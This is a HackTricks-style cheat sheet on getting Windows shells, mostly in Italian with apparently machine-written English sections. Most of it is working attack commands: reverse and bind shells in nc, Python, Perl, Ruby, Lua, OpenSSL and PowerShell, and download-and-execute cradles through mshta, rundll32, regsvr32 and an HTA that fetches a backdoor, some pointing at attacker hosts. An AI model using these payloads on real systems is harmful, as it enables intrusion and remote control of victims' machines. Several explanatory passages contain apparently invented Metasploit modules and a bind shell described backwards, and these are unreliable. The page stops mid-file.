# Shells - Windows

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repository di github.**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trova le vulnerabilità che contano di più in modo da poterle correggere più velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle applicazioni web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Lolbas

La pagina [lolbas-project.github.io](https://lolbas-project.github.io/) è per Windows come [https://gtfobins.github.io/](https://gtfobins.github.io/) è per linux.\
Ovviamente, **non ci sono file SUID o privilegi sudo in Windows**, ma è utile sapere **come** alcuni **binari** possono essere (ab)usati per eseguire qualche tipo di azione inaspettata come **eseguire codice arbitrario.**

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## SBD

**[sbd](https://www.kali.org/tools/sbd/) è un'alternativa portatile e sicura a Netcat**. Funziona su sistemi simili a Unix e Win32. Con funzionalità come la crittografia forte, l'esecuzione di programmi, le porte di origine personalizzabili e la riconnessione continua, sbd offre una soluzione versatile per la comunicazione TCP/IP. Per gli utenti Windows, la versione sbd.exe della distribuzione Kali Linux può essere utilizzata come affidabile sostituto di Netcat.
```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
## Python

Python è un linguaggio di programmazione ad alto livello, interpretato e orientato agli oggetti. È ampiamente utilizzato nel campo dell'hacking per la sua facilità di lettura e scrittura del codice. Python offre una vasta gamma di librerie e moduli che possono essere utilizzati per sviluppare strumenti di hacking personalizzati.

### Shell inversa Python

Una shell inversa Python è un tipo di shell che consente a un hacker di ottenere l'accesso remoto a un sistema compromesso. Questo tipo di shell è spesso utilizzato per eseguire comandi sul sistema remoto e ottenere informazioni sensibili.

Ecco un esempio di codice per creare una shell inversa Python:

```python
import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("indirizzo_ip", porta))
    
    while True:
        command = s.recv(1024).decode()
        if 'exit' in command:
            s.close()
            break
        else:
            output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(output.stdout.read())
            s.send(output.stderr.read())

def main():
    connect()

if __name__ == "__main__":
    main()
```

Per utilizzare questa shell inversa, è necessario sostituire "indirizzo_ip" con l'indirizzo IP del sistema remoto e "porta" con la porta desiderata per la connessione.

### Esecuzione di comandi di sistema

Python offre la possibilità di eseguire comandi di sistema utilizzando la funzione `subprocess.Popen()`. Questa funzione consente di eseguire comandi come se fossero eseguiti direttamente dalla riga di comando.

Ecco un esempio di codice per eseguire un comando di sistema utilizzando Python:

```python
import subprocess

command = "comando_di_sistema"
output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
print(output.stdout.read())
```

In questo esempio, è necessario sostituire "comando_di_sistema" con il comando desiderato da eseguire.

### Manipolazione di file

Python offre una vasta gamma di funzioni per manipolare file. Queste funzioni consentono di leggere, scrivere, copiare, spostare e eliminare file.

Ecco alcuni esempi di operazioni di manipolazione dei file utilizzando Python:

- Leggere il contenuto di un file:

```python
file = open("nome_file", "r")
content = file.read()
print(content)
file.close()
```

- Scrivere il contenuto in un file:

```python
file = open("nome_file", "w")
content = "contenuto_da_scrivere"
file.write(content)
file.close()
```

- Copiare un file:

```python
import shutil

shutil.copy("file_originale", "file_copia")
```

- Spostare un file:

```python
import shutil

shutil.move("file_originale", "nuova_posizione")
```

- Eliminare un file:

```python
import os

os.remove("nome_file")
```

In questi esempi, è necessario sostituire "nome_file" con il nome del file su cui si desidera eseguire l'operazione.
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl

Perl è un linguaggio di programmazione adatto per lo scripting e la manipolazione di testo. È ampiamente utilizzato nel campo dell'hacking per la sua flessibilità e potenza. In questa sezione, esploreremo alcune tecniche di hacking che possono essere eseguite utilizzando Perl.

### Reverse Shell con Perl

Un reverse shell è una tecnica che consente a un hacker di ottenere un accesso remoto a un sistema compromesso. Utilizzando Perl, è possibile creare un reverse shell in modo semplice ed efficace.

```perl
use Socket;
use FileHandle;

$ip = '192.168.0.1';
$port = 4444;

$proto = getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(SOCKET, sockaddr_in($port, inet_aton($ip))) or die "connect: $!";
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
exec('/bin/sh -i');
```

Nell'esempio sopra, il codice Perl crea una connessione TCP con l'indirizzo IP e la porta specificati. Successivamente, i descrittori di file STDIN, STDOUT e STDERR vengono ridirezionati sulla connessione, consentendo all'hacker di interagire con il sistema remoto come se fosse in locale.

### Esecuzione di comandi di sistema

Perl offre anche la possibilità di eseguire comandi di sistema all'interno di uno script. Questa funzionalità può essere utilizzata per eseguire comandi arbitrari sul sistema target.

```perl
system("command");
```

Nell'esempio sopra, "command" rappresenta il comando che si desidera eseguire. Ad esempio, è possibile utilizzare questa tecnica per eseguire comandi come `ls`, `cat`, `rm`, ecc.

### Manipolazione di file

Perl offre una vasta gamma di funzionalità per la manipolazione di file. Questo può essere utile durante un attacco per eseguire operazioni come la lettura, la scrittura o la modifica di file sul sistema target.

```perl
open(FILE, ">filename");
print FILE "content";
close(FILE);
```

Nell'esempio sopra, il codice Perl crea un nuovo file chiamato "filename" e vi scrive il contenuto specificato. È possibile utilizzare questa tecnica per creare file di configurazione malevoli o per sovrascrivere file esistenti con contenuto dannoso.

### Conclusioni

Perl è uno strumento potente per gli hacker grazie alla sua flessibilità e alle sue numerose funzionalità. Conoscere le tecniche di hacking che possono essere eseguite utilizzando Perl può essere estremamente utile per gli hacker che desiderano sfruttare al meglio questo linguaggio di programmazione.
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby è un linguaggio di programmazione dinamico, orientato agli oggetti e adatto per lo sviluppo di applicazioni web. È molto popolare tra gli sviluppatori per la sua sintassi semplice e leggibile.

### Esecuzione di comandi di sistema

In Ruby, è possibile eseguire comandi di sistema utilizzando il metodo `system` o il backtick (`). Ad esempio:

```ruby
system("ls -la")
```

```ruby
output = `ls -la`
```

Entrambi i metodi eseguiranno il comando di sistema specificato e restituiranno l'output risultante.

### Creazione di un reverse shell

Per creare un reverse shell in Ruby, è possibile utilizzare la libreria `socket`. Di seguito è riportato un esempio di codice per creare un reverse shell:

```ruby
require 'socket'

ip = '192.168.1.100'
port = 4444

socket = TCPSocket.new(ip, port)
socket.puts "Connected to reverse shell!"

while line = socket.gets
  output = `#{line}`
  socket.puts output
end

socket.close
```

In questo esempio, il codice si connette a un indirizzo IP e una porta specificati e invia un messaggio di connessione. Successivamente, il codice legge le linee inviate dal server e esegue i comandi di sistema corrispondenti. L'output viene quindi inviato al server.

### Esecuzione di codice Ruby da una stringa

È possibile eseguire codice Ruby da una stringa utilizzando il metodo `eval`. Ad esempio:

```ruby
code = "puts 'Hello, world!'"
eval(code)
```

Questo esempio eseguirà il codice Ruby specificato nella stringa e stamperà "Hello, world!" come output.

### Esecuzione di codice Ruby da un file

Per eseguire codice Ruby da un file, è possibile utilizzare il comando `ruby` seguito dal percorso del file. Ad esempio:

```ruby
ruby script.rb
```

Questo eseguirà il codice Ruby nel file `script.rb`.

### Conclusioni

Ruby offre molte funzionalità utili per l'esecuzione di comandi di sistema, la creazione di reverse shell e l'esecuzione di codice da stringhe o file. Questi sono solo alcuni esempi di ciò che è possibile fare con Ruby, ma le possibilità sono praticamente illimitate.
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua

Lua è un linguaggio di scripting leggero e potente che può essere utilizzato per l'hacking di shell su sistemi Windows. Lua è noto per la sua semplicità e flessibilità, rendendolo una scelta popolare tra gli hacker.

### Esecuzione di script Lua

Per eseguire uno script Lua su Windows, è possibile utilizzare l'interprete Lua incluso nel pacchetto di installazione di Lua. Ecco i passaggi da seguire:

1. Scarica e installa Lua dal sito ufficiale.
2. Apri il prompt dei comandi di Windows.
3. Naviga nella directory in cui è presente lo script Lua che desideri eseguire.
4. Esegui il comando `lua nome_script.lua`, sostituendo "nome_script.lua" con il nome effettivo del tuo script.

### Funzionalità di Lua per l'hacking di shell

Lua offre diverse funzionalità che possono essere utilizzate per l'hacking di shell su sistemi Windows. Alcune di queste funzionalità includono:

- Manipolazione dei file: Lua fornisce funzioni per leggere, scrivere e manipolare i file su un sistema Windows. Questo può essere utile per eseguire operazioni di hacking come la modifica dei file di configurazione o l'inserimento di payload in un file esistente.

- Interazione con il sistema operativo: Lua consente di interagire direttamente con il sistema operativo, consentendo agli hacker di eseguire comandi di shell e ottenere informazioni sul sistema target.

- Networking: Lua supporta la creazione di socket di rete, consentendo agli hacker di eseguire attacchi di rete come l'invio di pacchetti personalizzati o l'intercettazione del traffico di rete.

- Criptografia: Lua offre funzionalità di crittografia che possono essere utilizzate per crittografare o decrittografare dati sensibili durante un attacco di hacking.

### Esempi di script Lua per l'hacking di shell

Ecco alcuni esempi di script Lua che possono essere utilizzati per l'hacking di shell su sistemi Windows:

- Script per l'inserimento di un payload in un file di configurazione:

```lua
local file = io.open("config.txt", "a")
file:write("Payload da inserire nel file")
file:close()
```

- Script per l'esecuzione di un comando di shell:

```lua
os.execute("comando_di_shell")
```

- Script per la creazione di un socket di rete:

```lua
local socket = require("socket")
local client = socket.connect("indirizzo_ip", porta)
client:send("Dati da inviare al server")
```

Questi sono solo alcuni esempi di come Lua può essere utilizzato per l'hacking di shell su sistemi Windows. Con la sua semplicità e flessibilità, Lua offre molte possibilità per gli hacker creativi.
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Attaccante (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
# Windows Shells

## Introduction

In the context of hacking, a shell refers to a command-line interface that allows an attacker to interact with a compromised system. In this section, we will explore various methods to obtain a shell on a Windows system.

## Reverse Shells

A reverse shell is a technique where the compromised system connects back to the attacker's machine, allowing the attacker to execute commands remotely. There are several ways to achieve a reverse shell on a Windows system:

### Netcat

Netcat is a versatile networking utility that can be used to establish a reverse shell. The following command can be used to create a reverse shell using Netcat:

```bash
nc -e cmd.exe <attacker_ip> <port>
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

### PowerShell

PowerShell is a powerful scripting language that is built into Windows. It can be used to create a reverse shell using the following command:

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>', <port>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

### Metasploit

Metasploit is a popular framework for developing and executing exploits. It provides a wide range of modules, including ones for creating reverse shells on Windows systems. The following command can be used to create a reverse shell using Metasploit:

```bash
use exploit/multi/handler
set payload windows/shell_reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
exploit
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

## Bind Shells

A bind shell is a technique where the attacker listens on a specific port and waits for the compromised system to connect to it. This allows the attacker to gain control over the compromised system. There are several ways to achieve a bind shell on a Windows system:

### Netcat

Netcat can also be used to create a bind shell on a Windows system. The following command can be used to create a bind shell using Netcat:

```bash
nc -lvp <port> -e cmd.exe
```

Replace `<port>` with the desired port number.

### PowerShell

PowerShell can also be used to create a bind shell on a Windows system. The following command can be used to create a bind shell using PowerShell:

```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('<attacker_ip>', <port>); $listener.Start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

### Metasploit

Metasploit can also be used to create a bind shell on a Windows system. The following command can be used to create a bind shell using Metasploit:

```bash
use exploit/multi/handler
set payload windows/shell_bind_tcp
set LHOST <attacker_ip>
set LPORT <port>
exploit
```

Replace `<attacker_ip>` with the IP address of the attacker's machine and `<port>` with the desired port number.

## Conclusion

Obtaining a shell on a Windows system is a crucial step in the process of compromising a target. By using reverse shells or bind shells, an attacker can gain remote access and execute commands on the compromised system. It is important to choose the appropriate method based on the specific scenario and the tools available.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell

Powershell è un potente strumento di scripting e automazione di Windows che può essere utilizzato per eseguire una vasta gamma di attività. Può essere utilizzato per eseguire comandi di sistema, manipolare file e cartelle, gestire processi e molto altro ancora.

### Esecuzione di comandi

Per eseguire un comando in Powershell, è sufficiente digitare il comando seguito da eventuali argomenti. Ad esempio, per visualizzare la lista dei processi in esecuzione, è possibile utilizzare il comando `Get-Process`.

```
Get-Process
```

### Manipolazione di file e cartelle

Powershell offre una serie di comandi per manipolare file e cartelle. Ad esempio, è possibile creare una nuova cartella utilizzando il comando `New-Item` seguito dal percorso desiderato.

```
New-Item -ItemType Directory -Path C:\NuovaCartella
```

### Gestione dei processi

Powershell consente di gestire i processi in esecuzione sul sistema. Ad esempio, è possibile terminare un processo utilizzando il comando `Stop-Process` seguito dall'ID del processo.

```
Stop-Process -Id 1234
```

### Automazione delle attività

Powershell può essere utilizzato per automatizzare le attività ripetitive. Ad esempio, è possibile creare uno script Powershell che esegue una serie di comandi in sequenza.

```
$processi = Get-Process
foreach ($processo in $processi) {
    Write-Host $processo.Name
}
```

### Gestione dei servizi

Powershell consente di gestire i servizi di Windows. Ad esempio, è possibile avviare un servizio utilizzando il comando `Start-Service` seguito dal nome del servizio.

```
Start-Service -Name Servizio
```

### Gestione dei registri di sistema

Powershell offre una serie di comandi per gestire i registri di sistema di Windows. Ad esempio, è possibile creare una nuova voce di registro utilizzando il comando `New-ItemProperty` seguito dal percorso del registro e dai valori desiderati.

```
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion" -Name "NuovaVoce" -Value "Valore"
```

### Gestione delle variabili di ambiente

Powershell consente di gestire le variabili di ambiente di Windows. Ad esempio, è possibile visualizzare il valore di una variabile di ambiente utilizzando il comando `Get-ChildItem` seguito dal percorso della variabile.

```
Get-ChildItem Env:NomeVariabile
```

### Gestione dei servizi web

Powershell può essere utilizzato per gestire i servizi web. Ad esempio, è possibile inviare una richiesta HTTP utilizzando il comando `Invoke-WebRequest` seguito dall'URL desiderato.

```
Invoke-WebRequest -Uri https://www.esempio.com
```

### Conclusioni

Powershell è uno strumento estremamente potente per l'automazione e la gestione di Windows. Con una vasta gamma di comandi e funzionalità, può essere utilizzato per eseguire una varietà di attività. Saper utilizzare Powershell in modo efficace può essere un vantaggio significativo per i professionisti della sicurezza informatica.
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Processo che effettua una chiamata di rete: **powershell.exe**\
Payload scritto su disco: **NO** (_almeno da quanto ho potuto trovare usando procmon!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Processo che effettua una chiamata di rete: **svchost.exe**\
Payload scritto su disco: **cache locale del client WebDAV**

**One liner:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Ottieni ulteriori informazioni su diverse Shell di Powershell alla fine di questo documento**

## Mshta

* [Da qui](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```
#### **Esempio di shell inversa hta-psh (utilizza hta per scaricare ed eseguire un backdoor PS)**
```xml
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**È possibile scaricare ed eseguire facilmente un zombie Koadic utilizzando lo stager hta**

#### Esempio hta

[**Da qui**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**Da qui**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**

Mshta is a utility in Windows that allows you to execute HTML applications (HTAs). It can be used as a vector for delivering malicious payloads. In this section, we will explore how to use Mshta with Metasploit to gain remote access to a target system.

First, we need to generate a malicious HTA file using Metasploit. We can do this by using the `mshta` module. Set the `LHOST` and `LPORT` options to your IP address and the desired port for the reverse shell connection.

```
use exploit/windows/fileformat/mshta
set LHOST <your IP address>
set LPORT <desired port>
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

Once the HTA file is generated, we need to host it on a web server. You can use tools like `python -m SimpleHTTPServer` or `php -S 0.0.0.0:80` to quickly set up a web server.

Next, we need to deliver the HTA file to the target system. This can be done through various methods, such as social engineering or exploiting vulnerabilities in other applications.

Once the target opens the HTA file, it will execute the payload and establish a reverse shell connection to your machine. You can interact with the shell using the `sessions` command in Metasploit.

```
sessions -i 1
```

From here, you have full control over the target system and can perform various post-exploitation activities.

Remember to always use these techniques responsibly and with proper authorization. Unauthorized access to computer systems is illegal and unethical.
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Rilevato da Defender**




## **Rundll32**

[Esempio di Dll hello world](https://github.com/carterjones/hello-world-dll)

* [Da qui](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
**Rilevato da Defender**

**Rundll32 - sct**

[**Da qui**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL files. Metasploit, on the other hand, is a powerful framework used for penetration testing and exploiting vulnerabilities.

Metasploit provides a module called `exploit/windows/local/hta_print_uaf` that leverages the `rundll32.exe` utility to execute malicious code. This module takes advantage of a use-after-free vulnerability in Internet Explorer to gain remote code execution on the target system.

To use this module, follow these steps:

1. Set the required options:
   - `SESSION`: The session to run the exploit on.
   - `LHOST`: The IP address of the local machine.
   - `LPORT`: The port to listen on for the reverse shell.

2. Run the exploit:
   ```
   exploit
   ```

Once the exploit is successful, you will have a reverse shell on the target system, allowing you to execute commands and interact with the compromised machine.

It is important to note that the use of Metasploit for unauthorized access or any malicious activities is illegal and unethical. This information is provided for educational purposes only.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files as if they were executable files. This can be leveraged by attackers to load malicious DLLs and execute their code.

Koadic is a post-exploitation tool that uses the Rundll32 utility to load a malicious DLL and establish a command and control (C2) channel with the attacker. It provides a wide range of capabilities for post-exploitation activities, such as file manipulation, process management, and network reconnaissance.

To use Koadic, the attacker needs to generate a malicious DLL payload and host it on a web server. The payload can be generated using the Koadic framework, which provides various modules for different functionalities. Once the payload is hosted, the attacker can use Rundll32 to load the DLL and execute the desired commands.

The Rundll32 command to load a DLL using Koadic is as follows:

```
rundll32.exe <path_to_dll>,<entry_point>
```

The `<path_to_dll>` parameter should be replaced with the URL of the malicious DLL hosted on the web server. The `<entry_point>` parameter specifies the function within the DLL that should be executed.

By using Rundll32 with Koadic, attackers can maintain persistence on compromised systems and perform various malicious activities without being detected. It is important for defenders to monitor for any suspicious use of Rundll32 and regularly update their security measures to mitigate this type of attack.

**Rundll32 - Koadic (Italian Translation)**

Rundll32 è un'utilità di Windows che consente l'esecuzione di file DLL come se fossero file eseguibili. Ciò può essere sfruttato dagli attaccanti per caricare DLL dannose ed eseguire il loro codice.

Koadic è uno strumento di post-exploitation che utilizza l'utilità Rundll32 per caricare una DLL dannosa e stabilire un canale di controllo e comando (C2) con l'attaccante. Fornisce una vasta gamma di funzionalità per attività di post-exploitation, come la manipolazione dei file, la gestione dei processi e la ricognizione di rete.

Per utilizzare Koadic, l'attaccante deve generare un payload DLL dannoso e ospitarlo su un server web. Il payload può essere generato utilizzando il framework Koadic, che fornisce vari moduli per diverse funzionalità. Una volta ospitato il payload, l'attaccante può utilizzare Rundll32 per caricare la DLL ed eseguire i comandi desiderati.

Il comando Rundll32 per caricare una DLL utilizzando Koadic è il seguente:

```
rundll32.exe <percorso_della_dll>,<punto_di_ingresso>
```

Il parametro `<percorso_della_dll>` deve essere sostituito con l'URL della DLL dannosa ospitata sul server web. Il parametro `<punto_di_ingresso>` specifica la funzione all'interno della DLL che deve essere eseguita.

Utilizzando Rundll32 con Koadic, gli attaccanti possono mantenere la persistenza sui sistemi compromessi e svolgere varie attività dannose senza essere rilevati. È importante per i difensori monitorare qualsiasi uso sospetto di Rundll32 e aggiornare regolarmente le misure di sicurezza per mitigare questo tipo di attacco.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

* [Da qui](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
**Rilevato da Defender**

#### Regsvr32 -sct

[**Da qui**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
